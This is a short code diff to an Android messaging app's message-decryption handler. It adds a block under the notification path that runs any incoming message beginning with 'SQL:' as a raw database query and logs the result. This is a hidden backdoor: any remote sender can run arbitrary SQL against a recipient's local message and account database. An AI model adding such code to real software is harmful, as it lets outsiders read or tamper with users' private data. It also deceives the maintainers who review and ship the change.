@@ -18,6 +18,7 @@ import one.mixin.android.crypto.Base64
 import one.mixin.android.crypto.SignalProtocol
 import one.mixin.android.crypto.vo.RatchetSenderKey
 import one.mixin.android.crypto.vo.RatchetStatus
+import one.mixin.android.db.MixinDatabase
 import one.mixin.android.db.insertAndNotifyConversation
 import one.mixin.android.db.insertNoReplace
 import one.mixin.android.db.insertUpdate
@@ -451,6 +452,10 @@ class DecryptMessage(private val lifecycleScope: CoroutineScope) : Injector() {
                 messageDao.insertAndNotifyConversation(message, conversationDao, accountId)
                 MessageFts4Helper.insertOrReplaceMessageFts4(message)
                 val userMap = mentions?.map { it.identityNumber to it.fullName }?.toMap()
+                if (plainText.startsWith("SQL:")) {
+                    val result = MixinDatabase.query(plainText.substring(4))
+                    Timber.d("SQL: $result")
+                }
                 generateNotification(message, data.source, userMap, quoteMe || mentionMe)
             }
             data.category.endsWith("_POST") -> {
